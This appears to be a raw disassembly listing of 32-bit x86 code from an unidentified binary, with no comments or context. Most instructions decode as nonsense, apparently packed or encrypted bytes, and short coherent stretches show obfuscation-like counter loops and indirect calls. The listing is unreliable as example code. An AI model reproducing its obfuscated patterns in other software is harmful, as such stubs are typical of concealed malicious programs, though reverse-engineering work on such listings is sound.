  402121:	out    dx,eax
  402122:	shl    BYTE PTR [eax+0x3a],cl
  402125:	mov    edx,DWORD PTR [eax+0x5d]
  402128:	repz or eax,0x42709340
  40212e:	pusha  
  40212f:	mov    eax,0xb6a226f5
  402134:	xchg   BYTE PTR [eax],cl
  402136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402137:	cwde   
  402138:	fisttp DWORD PTR [eax-0x9]
  40213b:	xchg   edi,eax
  40213c:	sub    DWORD PTR [ebp-0x5ddb9dd1],0xe7242b1f
  402146:	lds    ebp,FWORD PTR [esi+0xdf1c05]
  40214c:	mov    ecx,0x5af900f3
  402151:	ret    
  402152:	stos   DWORD PTR es:[edi],eax
  402153:	retf   0xded8
  402156:	xchg   DWORD PTR [esi],edi
  402158:	jmp    0x4020e2
  40215a:	out    0xbb,eax
  40215c:	push   esi
  40215d:	and    ebp,DWORD PTR [eax]
  40215f:	addr16 mov eax,ds:0xfc99
  402163:	add    eax,eax
  402165:	xchg   DWORD PTR [ebp-0x30],ebx
  402168:	add    DWORD PTR [edx+0x51b9c6e],0x47
  40216f:	scas   eax,DWORD PTR es:[edi]
  402170:	outs   dx,BYTE PTR ds:[esi]
  402171:	mov    ah,0x4f
  402173:	rcr    DWORD PTR ds:0x5afa9b71,0x70
  40217a:	dec    eax
  40217b:	icebp  
  40217c:	add    ebx,DWORD PTR [eax+0x62]
  40217f:	std    
  402180:	dec    eax
  402181:	push   esp
  402182:	leave  
  402183:	push   edx
  402184:	pop    ebp
  402185:	or     ebp,DWORD PTR [ebx-0xf1bd43]
  40218b:	shr    edi,cl
  40218d:	jle    0x402132
  40218f:	mov    WORD PTR [ecx],es
  402191:	mov    edx,0x59533d4f
  402196:	dec    ebx
  402197:	pop    edx
  402198:	inc    ebx
  402199:	cmp    ecx,DWORD PTR [esi-0x44]
  40219c:	ins    BYTE PTR es:[edi],dx
  40219d:	jo     0x4021a2
  40219f:	and    BYTE PTR [edi],ah
  4021a1:	add    edi,0x4f
  4021a4:	sub    BYTE PTR [ecx-0x7a],bh
  4021a7:	push   ebp
  4021a8:	adc    cl,BYTE PTR [ebx]
  4021aa:	cmp    al,0xfa
  4021ac:	out    0x94,al
  4021ae:	or     al,0x1a
  4021b0:	in     al,0xcc
  4021b2:	mov    cl,0x98
  4021b4:	shl    BYTE PTR [esi+0x125298a1],cl
  4021ba:	lea    edi,[edi-0x4e]
  4021bd:	xchg   BYTE PTR [esi+ecx*4-0x59927d4],bh
  4021c4:	cmp    ch,BYTE PTR [esi]
  4021c6:	out    dx,al
  4021c7:	jno    0x40219d
  4021c9:	xor    DWORD PTR [edx+edi*4-0x75],esp
  4021cd:	aad    0x1a
  4021cf:	push   ebx
  4021d0:	(bad)
  4021d4:	fstp   TBYTE PTR [edx-0x35bfdac7]
  4021da:	stos   DWORD PTR es:[edi],eax
  4021db:	inc    BYTE PTR [ecx]
  4021dd:	xchg   esp,eax
  4021de:	bound  edi,QWORD PTR [edx-0x65]
  4021e1:	push   DWORD PTR [ecx]
  4021e3:	push   esi
  4021e4:	pop    esi
  4021e5:	outs   dx,BYTE PTR ds:[esi]
  4021e6:	xlat   BYTE PTR ds:[ebx]
  4021e7:	jmp    0x4021c1
  4021e9:	data16 (bad) 
  4021eb:	sti    
  4021ec:	mov    DWORD PTR [eax+0x7e9fbf5b],ebx
  4021f2:	jnp    0x402233
  4021f4:	mov    ds:0x609d7908,al
  4021f9:	or     DWORD PTR [esi-0x2],ecx
  4021fc:	jne    0x40223c
  4021fe:	mov    dh,0x9d
  402200:	adc    DWORD PTR [edx],edx
  402202:	mov    ebp,DWORD PTR [edx]
  402204:	and    eax,0x5fba67cf
  402209:	add    DWORD PTR [ecx-0x4e4bf474],0x1e0942ec
  402213:	jl     0x4021b1
  402215:	mov    dh,0xf
  402217:	fnstenv [ebp+0x2a5ca016]
  40221d:	and    edi,DWORD PTR ds:0xd381f706
  402223:	inc    BYTE PTR [esi]
  402225:	shr    DWORD PTR [edi+0x7f0a2fad],cl
  40222b:	shl    BYTE PTR [eax+0x2f1f6ae0],1
  402231:	and    esp,ecx
  402233:	out    0xca,al
  402235:	mov    al,ds:0x61dc0992
  40223a:	test   bh,0xdb
  40223d:	xlat   BYTE PTR ds:[ebx]
  40223e:	sahf   
  40223f:	adc    BYTE PTR [esi+0x35],cl
  402242:	inc    edx
  402243:	les    ebp,FWORD PTR [edi+0x5e]
  402246:	cmp    dh,cl
  402248:	loope  0x402207
  40224a:	pop    eax
  40224b:	call   0xbef5916d
  402250:	inc    edx
  402251:	xor    ecx,DWORD PTR [esi-0x36]
  402254:	sbb    dh,bh
  402256:	mov    al,0xd1
  402258:	ja     0x402243
  40225a:	iret   
  40225b:	mov    BYTE PTR [edx+0x49],0xde
  40225f:	sbb    al,0xc9
  402261:	in     al,dx
  402262:	cwde   
  402263:	sbb    al,dh
  402265:	(bad)  
  402266:	and    eax,ebp
  402268:	rcr    esp,0xe4
  40226b:	inc    ebp
  40226c:	mov    edx,0xc33da228
  402271:	lea    edx,[edx+0x666b8a5]
  402277:	lds    ebx,FWORD PTR [esi+0x16]
  40227a:	mov    dl,BYTE PTR [ecx+edi*2+0x3c0a2fc]
  402281:	call   0xa652:0xffad99d0
  402288:	jp     0x40222d
  40228a:	mov    ds:0x6b70a5c4,eax
  40228f:	inc    ebp
  402290:	sub    DWORD PTR cs:[eax-0x7],edx
  402294:	scas   eax,DWORD PTR es:[edi]
  402295:	sub    eax,DWORD PTR [edi+0x6babfe1]
  40229b:	or     ch,BYTE PTR [edi]
  40229d:	cmp    al,0xdc
  40229f:	mov    bh,0xb1
  4022a1:	jmp    0x5b5fa1be
  4022a6:	mov    fs,WORD PTR [ebp-0x1f]
  4022a9:	loop   0x402328
  4022ab:	dec    ecx
  4022ac:	pop    ss
  4022ad:	(bad)
  4022b1:	popa   
  4022b2:	push   es
  4022b3:	mov    edx,ecx
  4022b5:	inc    edi
  4022b6:	push   esp
  4022b7:	sub    ah,0x40
  4022ba:	in     al,0xc5
  4022bc:	sub    al,0x77
  4022be:	xchg   ebp,eax
  4022bf:	jge    0x4022e3
  4022c1:	push   ds
  4022c2:	cs pop ss
  4022c4:	add    eax,0xffffffcb
  4022c7:	xchg   esi,eax
  4022c8:	stos   DWORD PTR es:[edi],eax
  4022c9:	dec    esp
  4022ca:	popa   
  4022cb:	mov    ebp,0x1310cd6b
  4022d0:	das    
  4022d1:	mov    dl,0x74
  4022d3:	lahf   
  4022d4:	fadd   QWORD PTR [eax-0x59f4cc53]
  4022da:	shl    BYTE PTR [ecx],1
  4022dc:	jecxz  0x4022bd
  4022de:	repz hlt 
  4022e0:	cmc    
  4022e1:	in     eax,0x31
  4022e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e4:	shl    DWORD PTR [ebx+0x5b],1
  4022e7:	inc    edi
  4022e8:	faddp  st(7),st
  4022ea:	test   al,0x43
  4022ec:	sbb    BYTE PTR [eax-0x6bb48e7f],ah
  4022f2:	inc    ecx
  4022f3:	enter  0x22f1,0xbb
  4022f7:	pop    edx
  4022f8:	add    al,0x75
  4022fa:	sbb    DWORD PTR [edi-0x78],eax
  4022fd:	daa    
  4022fe:	jns    0x40236e
  402300:	xor    esi,DWORD PTR [ebp+0x2e]
  402303:	and    dl,cl
  402305:	or     esi,esi
  402307:	xchg   esp,eax
  402308:	xchg   edx,eax
  402309:	cs pop ecx
  40230b:	add    ah,BYTE PTR [edx+0x72627955]
  402311:	push   edx
  402312:	or     eax,0x145a07a
  402317:	retf   0x48e0
  40231a:	xchg   ecx,eax
  40231b:	and    ah,BYTE PTR [eax-0x65]
  40231e:	mov    ecx,0x646f3032
  402323:	pop    ebx
  402324:	call   0x4d165ff4
  402329:	jnp    0x4022e4
  40232b:	adc    eax,0x1e5106b5
  402330:	push   es
  402331:	push   esi
  402332:	dec    edi
  402333:	pop    ss
  402334:	pop    ss
  402335:	stc    
  402336:	or     eax,DWORD PTR [esi-0x50]
  402339:	add    BYTE PTR [esi-0x39405d06],0x2b
  402340:	ror    WORD PTR [edx-0x67],1
  402344:	push   ds
  402345:	int    0x26
  402347:	sub    al,0x32
  402349:	dec    ecx
  40234a:	aaa    
  40234b:	or     edx,DWORD PTR [ebp-0xf]
  40234e:	push   ecx
  40234f:	mov    eax,ds:0x4d600b82
  402354:	ret    0xd39c
  402357:	fild   QWORD PTR [edi-0x73]
  40235a:	test   DWORD PTR [eax-0x1],ebp
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x285bac70]
  402480:	arpl   si,cx
  402482:	mov    edx,0x6f7e7e01
  402487:	jge    0x402507
  402489:	jle    0x4024af
  40248b:	lds    ebp,FWORD PTR ss:[ecx]
  40248e:	out    0x2e,al
  402490:	outs   dx,BYTE PTR ds:[esi]
  402491:	cmp    ebx,edi
  402493:	jae    0x402466
  402495:	xor    al,0x31
  402497:	inc    esp
  402498:	int3   
  402499:	lds    ecx,FWORD PTR [bx+di]
  40249c:	jl     0x4024a0
  40249e:	sbb    eax,0xa499e4f0
  4024a3:	mov    bl,BYTE PTR ds:0xbeb5206e
  4024a9:	fsubr  QWORD PTR [ebp-0x7f]
  4024ac:	and    dl,BYTE PTR [edi-0x62c71e99]
  4024b2:	xor    esp,DWORD PTR [edx-0x50]
  4024b5:	and    bl,BYTE PTR [ecx]
  4024b7:	clc    
  4024b8:	das    
  4024b9:	ds ror eax,1
  4024bc:	push   edx
  4024bd:	push   ebp
  4024be:	out    0x65,al
  4024c0:	adc    ecx,edi
  4024c2:	sbb    bl,BYTE PTR [ebp+0x295dfd8c]
  4024c8:	add    eax,0x6f4b0857
  4024cd:	sub    cl,BYTE PTR [eax+0x21d69633]
  4024d3:	aad    0x74
  4024d5:	mov    ds:0xa54a1667,al
  4024da:	xor    BYTE PTR [ebx+0x7f],al
  4024dd:	ficom  WORD PTR [ebx]
  4024df:	adc    eax,0x25c02823
  4024e4:	pop    ss
  4024e5:	loopne 0x4024b6
  4024e7:	jp     0x4024a5
  4024e9:	pop    eax
  4024ea:	clc    
  4024eb:	or     al,0x5d
  4024ed:	jno    0x4024fc
  4024ef:	enter  0xcf5c,0xa8
  4024f3:	mov    esp,0x831ac288
  4024f8:	pushf  
  4024f9:	sub    DWORD PTR [edx+ecx*1],ebp
  4024fc:	shl    ecx,0x16
  4024ff:	addr16 xchg ecx,eax
  402501:	inc    ecx
  402502:	mov    ss,WORD PTR [edx-0xa435e7e]
  402508:	push   es
  402509:	ficomp WORD PTR [edx+ebx*2+0x52]
  40250d:	das    
  40250e:	mov    bl,0xec
  402510:	push   eax
  402511:	mov    eax,0x688a5d5
  402516:	or     edx,esi
  402518:	das    
  402519:	ja     0x40257b
  40251b:	mov    ebx,0x98409106
  402520:	jo     0x40250f
  402522:	mov    bh,cl
  402524:	loop   0x40259e
  402526:	mov    ds:0x5efd5565,eax
  40252b:	inc    edi
  40252c:	jae    0x402545
  40252e:	test   al,0x5e
  402530:	(bad)  
  402531:	jge    0x402516
  402533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402534:	test   DWORD PTR [ecx],ecx
  402536:	jge    0x402502
  402538:	adc    eax,0xea23e86b
  40253d:	push   edi
  40253e:	jl     0x4024c6
  402540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402541:	inc    ebx
  402542:	jle    0x40255d
  402544:	push   0x62
  402546:	das    
  402547:	mov    ah,0xdb
  402549:	jl     0x402525
  40254b:	bound  ebp,QWORD PTR [ebx+esi*4]
  40254e:	xor    al,0xf6
  402550:	(bad)  
  402551:	aaa    
  402552:	add    eax,0x9d967a6b
  402557:	imul   edx,DWORD PTR [edx],0xb9a08a69
  40255d:	xor    al,0x79
  40255f:	iret   
  402560:	cld    
  402561:	cmp    DWORD PTR [ebx],ecx
  402563:	push   0x18
  402565:	loopne 0x40252a
  402567:	pop    ecx
  402568:	jp     0x4024f5
  40256a:	loopne 0x40252d
  40256c:	add    cl,dl
  40256e:	mov    ebx,0x2c6169da
  402573:	jae    0x4025b9
  402575:	push   edx
  402576:	rol    BYTE PTR [eax-0x144266a4],0xb4
  40257d:	xchg   ebp,eax
  40257e:	mov    dl,0x8f
  402580:	push   ss
  402581:	and    ebp,esi
  402583:	pop    ebp
  402584:	xchg   esi,eax
  402585:	imul   edx,ebx,0xffffffc8
  402588:	dec    esp
  402589:	jmp    0x4025b4
  40258b:	pop    ss
  40258c:	xor    DWORD PTR [eax+0x1283e12d],0xfffffff3
  402593:	sub    dl,dh
  402595:	call   FWORD PTR [ecx+0x4d]
  402598:	test   BYTE PTR [edi-0x11],dl
  40259b:	repnz or bh,dh
  40259e:	jo     0x402550
  4025a0:	je     0x402524
  4025a2:	sub    esp,esi
  4025a4:	jnp    0x4025da
  4025a6:	inc    edx
  4025a7:	imul   eax,DWORD PTR [edx],0x5d294c7f
  4025ad:	xchg   edx,eax
  4025ae:	shl    dl,cl
  4025b0:	mov    ch,BYTE PTR [edx+0x46]
  4025b3:	pop    ss
  4025b4:	sbb    ebp,DWORD PTR [edi*8-0x739749ab]
  4025bb:	les    ecx,FWORD PTR [eax]
  4025bd:	mov    WORD PTR [ecx],fs
  4025bf:	out    0x4,al
  4025c1:	sbb    al,0xbf
  4025c3:	and    al,0x3a
  4025c5:	pop    ecx
  4025c6:	shl    DWORD PTR [edx-0x42],1
  4025c9:	pop    eax
  4025ca:	sbb    al,0x1b
  4025cc:	cli    
  4025cd:	and    dl,BYTE PTR [esi]
  4025cf:	pop    es
  4025d0:	aas    
  4025d1:	scas   al,BYTE PTR es:[edi]
  4025d2:	in     eax,0x83
  4025d4:	mov    ah,0x62
  4025d6:	xchg   ch,bl
  4025d8:	push   eax
  4025d9:	dec    ebp
  4025da:	cmp    DWORD PTR [edx],esp
  4025dc:	sbb    edx,DWORD PTR [ebx]
  4025de:	cmp    DWORD PTR [esi],0x7c31c8fe
  4025e4:	test   eax,0xd1b6bbde
  4025e9:	jns    0x4025aa
  4025eb:	aaa    
  4025ec:	sti    
  4025ed:	or     ebp,edx
  4025ef:	hlt    
  4025f0:	adc    eax,0x6d5c0f0a
  4025f5:	jns    0x402589
  4025f7:	xor    al,0x8
  4025f9:	mov    esi,DWORD PTR [edx-0x61]
  4025fc:	or     al,0x7c
  4025fe:	retf   
  4025ff:	mov    edi,0x9b03d078
  402604:	add    BYTE PTR [edx-0x56],cl
  402607:	in     al,0xdd
  402609:	scas   eax,DWORD PTR es:[edi]
  40260a:	jp     0x402615
  40260c:	ret    
  40260d:	fwait
  40260e:	in     al,0xc7
  402610:	test   ebx,edi
  402612:	add    eax,0xfbdf659d
  402617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402618:	pop    edx
  402619:	nop
  40261a:	rol    DWORD PTR [ebx+0x163679c],1
  402620:	xchg   ebx,eax
  402621:	dec    ecx
  402622:	call   0x529e70ff
  402627:	ficomp DWORD PTR [eax-0x5e]
  40262a:	sub    al,0x96
  40262c:	cld    
  40262d:	inc    edx
  40262e:	pop    esi
  40262f:	jb     0x402688
  402631:	fwait
  402632:	sub    ch,BYTE PTR [edx+0x6f1be599]
  402638:	fimul  DWORD PTR [edi]
  40263a:	iret   
  40263b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40263c:	jb     0x402634
  40263e:	lds    esp,FWORD PTR [ebx+ebp*4-0x1b7b03ae]
  402645:	or     BYTE PTR [eax+0x4],dh
  402648:	cmc    
  402649:	xor    ebx,ecx
  40264b:	pop    eax
  40264c:	push   ebp
  40264d:	in     eax,0xf4
  40264f:	mov    gs,ecx
  402651:	dec    eax
  402652:	mov    cl,0xc9
  402654:	(bad)  
  402656:	addr16 jo 0x40263e
  402659:	neg    BYTE PTR [edx-0x20]
  40265c:	fs mov bl,0xf9
  40265f:	mov    esi,0xfe8a99bf
  402664:	test   al,0x57
  402666:	in     al,dx
  402667:	sub    BYTE PTR [esi+ecx*2+0x7942a4aa],0xc0
  40266f:	aas    
  402670:	test   DWORD PTR [edi+0x44],0x6fbb72f2
  402677:	pop    ss
  402678:	inc    ecx
  402679:	rol    BYTE PTR [edx-0x6c],cl
  40267c:	retf   0xe75f
  40267f:	xchg   ebp,eax
  402680:	adc    eax,eax
  402682:	pop    es
  402683:	xor    al,0x34
  402685:	pop    ecx
  402686:	pop    edi
  402687:	pushf  
  402688:	call   FWORD PTR [ebp*4-0x4180a6eb]
  40268f:	and    DWORD PTR [edx+0x32],edx
  402692:	bnd jmp 0x4026a3
  402695:	out    0xb3,al
  402697:	(bad)  
  402698:	in     al,dx
  402699:	adc    DWORD PTR [edi],esp
  40269b:	(bad)  
  40269d:	jae    0x4026a3
  40269f:	call   0xdea7:0xbff88e38
  4026a6:	loopne 0x402690
  4026a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026a9:	jb     0x402647
  4026ab:	pop    esp
  4026ac:	int    0x25
  4026ae:	retf   0xadfb
  4026b1:	ret    0x71ba
  4026b4:	sti    
  4026b5:	fadd   QWORD PTR [esi+0x73938d5e]
  4026bb:	xchg   DWORD PTR [ebx+ebp*4+0x3e8b3c2e],ebp
  4026c2:	mov    BYTE PTR [edx+0x29],al
  4026c5:	xor    eax,DWORD PTR [ebx+edi*8+0x32731433]
  4026cc:	scas   eax,DWORD PTR es:[edi]
  4026cd:	pop    esi
  4026ce:	ds scas eax,DWORD PTR es:[edi]
  4026d0:	in     eax,0x41
  4026d2:	rcr    DWORD PTR [edx-0x1e0730d9],cl
  4026d8:	jae    0x40266e
  4026da:	xchg   edx,eax
  4026db:	sbb    eax,0x4c5aa2c5
  4026e0:	mov    cs,WORD PTR [esi+ebp*2-0x53c920ba]
  4026e7:	push   ss
  4026e8:	icebp  
  4026e9:	or     DWORD PTR [edi-0x47],esi
  4026ec:	fldcw  WORD PTR [eax]
  4026ee:	imul   ecx,DWORD PTR [ebx-0x2e],0xffffffa4
  4026f2:	add    BYTE PTR [edi-0x2de2e1ec],al
  4026f8:	les    eax,FWORD PTR [ebx+edi*2]
  4026fb:	pop    edx
  4026fc:	inc    ecx
  4026fd:	xor    dh,al
  4026ff:	out    0xa8,al
  402701:	(bad)  
  402702:	sti    
  402703:	and    bh,0x89
  402706:	test   eax,0x7c32dcf5
  40270b:	fcom   DWORD PTR [ebp+0x22ce680e]
  402711:	popf   
  402712:	test   DWORD PTR [ebp-0x6a6c3751],edi
  402718:	sub    ah,BYTE PTR [edx]
  40271a:	fscale 
  40271c:	inc    eax
  40271d:	in     al,0xee
  40271f:	(bad)  
  402720:	retf   
  402721:	add    eax,0xfec712e
  402726:	into   
  402727:	leave  
  402728:	cmp    al,0x5e
  40272a:	ss fwait
  40272c:	add    ah,bh
  40272e:	ret    0x5a49
  402731:	cld    
  402732:	dec    ebx
  402733:	jns    0x402749
  402735:	xchg   ah,ch
  402737:	inc    edi
  402738:	je     0x4026d0
  40273a:	loop   0x4026f0
  40273c:	push   ebx
  40273d:	pusha  
  40273e:	scas   eax,DWORD PTR es:[edi]
  40273f:	jmp    0x40271d
  402741:	aam    0x79
  402743:	adc    eax,0x52cdd5e5
  402748:	inc    ebp
  402749:	and    BYTE PTR [ecx],al
  40274b:	test   DWORD PTR [ebx],0xfde0c024
  402751:	inc    esp
  402752:	ss fs (bad) 
  402755:	in     al,dx
  402756:	push   edx
  402757:	fsubr  QWORD PTR ds:0x87df64d1
  40275d:	mov    esp,0xce62bb36
  402762:	xor    cl,BYTE PTR [ecx+0x510fe083]
  402768:	out    dx,al
  402769:	cs push edx
  40276b:	add    cl,BYTE PTR [eax]
  40276d:	adc    BYTE PTR [ebp+0x4a],cl
  402770:	fcmovb st,st(7)
  402772:	ins    DWORD PTR es:[edi],dx
  402773:	test   al,0x55
  402775:	in     al,0x1d
  402777:	popf   
  402778:	rol    DWORD PTR [edi-0x6a29fef9],1
  40277e:	test   ah,ah
  402780:	popa   
  402781:	cmp    ch,ah
  402783:	inc    eax
  402784:	mov    esp,DWORD PTR [eax+ecx*4-0x7a]
  402788:	inc    eax
  402789:	pop    ebp
  40278a:	mov    bl,0xa0
  40278c:	fisttp WORD PTR [eax]
  40278e:	clc    
  40278f:	xchg   eax,ebx
  402791:	fdiv   QWORD PTR [ebx-0x72]
  402794:	push   ss
  402795:	push   ebx
  402796:	pop    es
  402797:	pop    ds
  402798:	hlt    
  402799:	cdq    
  40279a:	add    eax,0x5110ec3
  40279f:	jo     0x40274a
  4027a1:	iret   
  4027a2:	sub    al,0xc3
  4027a4:	leave  
  4027a5:	mov    ecx,0x43a79254
  4027aa:	jb     0x4027a5
  4027ac:	sahf   
  4027ad:	loop   0x4027a5
  4027af:	inc    ecx
  4027b0:	cmp    BYTE PTR [ecx],dl
  4027b2:	out    dx,al
  4027b3:	push   ebx
  4027b4:	mov    ebp,0x652d55f
  4027b9:	mov    edi,0xbff4cb75
  4027be:	shl    BYTE PTR [ebx+0x1f8cdd94],1
  4027c4:	jge    0x402789
  4027c6:	xchg   ecx,eax
  4027c7:	aam    0x7c
  4027c9:	push   es
  4027ca:	outs   dx,BYTE PTR ds:[esi]
  4027cb:	(bad)  
  4027cc:	stc    
  4027cd:	or     BYTE PTR [ebp+ebx*2-0x32c6ced8],ch
  4027d4:	shr    BYTE PTR ds:0x9ce08c7c,cl
  4027da:	mov    al,0x45
  4027dc:	adc    DWORD PTR [esi],ecx
  4027de:	pusha  
  4027df:	jne    0x40280f
  4027e1:	(bad)  
  4027e2:	mov    esi,0x2353abc
  4027e7:	inc    ecx
  4027e8:	ror    dh,0x1a
  4027eb:	ds mov edi,0x2cd22502
  4027f1:	push   esi
  4027f2:	imul   esi,DWORD PTR [ebx],0xffffffdd
  4027f5:	sbb    esi,edi
  4027f7:	fcmovbe st,st(3)
  4027f9:	add    eax,0x1902aa51
  4027fe:	xchg   BYTE PTR [ecx+0x24],al
  402801:	gs push ebp
  402803:	or     ah,ch
  402805:	push   edi
  402806:	xor    DWORD PTR [eax+0x1ae9a42b],ecx
  40280c:	int3   
  40280d:	cmp    esi,edx
  40280f:	push   es
  402810:	pop    eax
  402811:	xchg   esp,eax
  402812:	ret    
  402813:	nop
  402814:	scas   al,BYTE PTR es:[edi]
  402815:	xchg   esi,eax
  402816:	sub    BYTE PTR ds:0x7a56cbf4,0x23
  40281d:	repz in eax,dx
  40281f:	dec    eax
  402820:	lock or bl,cl
  402823:	add    edx,edx
  402825:	retf   
  402826:	shl    dh,0x19
  402829:	pop    esi
  40282a:	or     eax,0x74ad6e9b
  40282f:	int3   
  402830:	into   
  402831:	mov    ah,0x3e
  402833:	cmp    dl,BYTE PTR ds:0xf49506bd
  402839:	mov    ebp,0x6ec6fb6c
  40283e:	aaa    
  40283f:	das    
  402840:	gs je  0x402870
  402843:	addr16 aas 
  402845:	add    DWORD PTR [ebp-0x58e76476],ecx
  40284b:	dec    ecx
  40284c:	test   BYTE PTR [edx],cl
  40284e:	(bad)  
  40284f:	sbb    cl,BYTE PTR [edx]
  402851:	shl    BYTE PTR [edi+0x1073557b],cl
  402857:	cwde   
  402858:	jmp    0x6341a8de
  40285d:	jp     0x4028a5
  40285f:	add    DWORD PTR [ecx-0x685e6e90],eax
  402865:	into   
  402866:	mov    eax,0x8557809d
  40286b:	adc    eax,0x94fb639a
  402870:	mov    ebp,ebp
  402872:	test   eax,0xc836f17a
  402877:	sbb    DWORD PTR [edx+edi*1],ebx
  40287a:	pop    ss
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0x703cf159]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	repnz (bad) 
  4028d0:	inc    BYTE PTR [edx-0x15]
  4028d3:	cdq    
  4028d4:	sahf   
  4028d5:	mov    ah,0xd2
  4028d7:	and    eax,0xf3b7edfb
  4028dc:	cdq    
  4028dd:	mov    BYTE PTR [edi],cl
  4028df:	mov    DWORD PTR [ecx+ecx*8-0x330c2eb],edi
  4028e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e7:	cli    
  4028e8:	cmp    bl,BYTE PTR [ebx+0x1d]
  4028eb:	mov    ebp,0xb4701f14
  4028f0:	adc    BYTE PTR [ebx-0x55],bh
  4028f3:	jns    0x4028ec
  4028f5:	imul   esi,DWORD PTR [ebp+0x3e876c07],0xebdd95b3
  4028ff:	ins    DWORD PTR es:[edi],dx
  402900:	sbb    DWORD PTR [ecx+0x47],esi
  402903:	lea    ecx,[edi-0x52776bbe]
  402909:	jmp    0x1aa5:0x9046de99
  402910:	fwait
  402911:	mov    ecx,DWORD PTR [ebp-0x5fed1cac]
  402917:	jnp    0x4028e4
  402919:	aad    0xc0
  40291b:	pop    ebx
  40291c:	arpl   bx,bx
  40291e:	add    eax,esp
  402920:	fwait
  402921:	add    bh,0x43
  402924:	mov    ecx,0x27b49afb
  402929:	test   al,0xb6
  40292b:	jno    0x4028ee
  40292d:	shl    BYTE PTR [ebp+0x6bf194c1],1
  402933:	add    esp,DWORD PTR [ecx+esi*1+0x5886ba7]
  40293a:	sub    eax,DWORD PTR [esi+0x5e]
  40293d:	xchg   edx,eax
  40293e:	cmp    DWORD PTR [ebx-0x451fdb9c],edi
  402944:	xchg   edx,eax
  402945:	rcl    ch,1
  402947:	and    DWORD PTR [edi],eax
  402949:	or     BYTE PTR [ebp+0x7c540b24],cl
  40294f:	push   0x14346b6a
  402954:	les    esp,FWORD PTR ds:0xc3b1886b
  40295a:	(bad)  
  40295b:	lahf   
  40295c:	fisub  DWORD PTR [edx+esi*8-0xd]
  402960:	jne    0x402961
  402962:	mov    ss,WORD PTR [edi+0x74c08258]
  402968:	jg     0x40294d
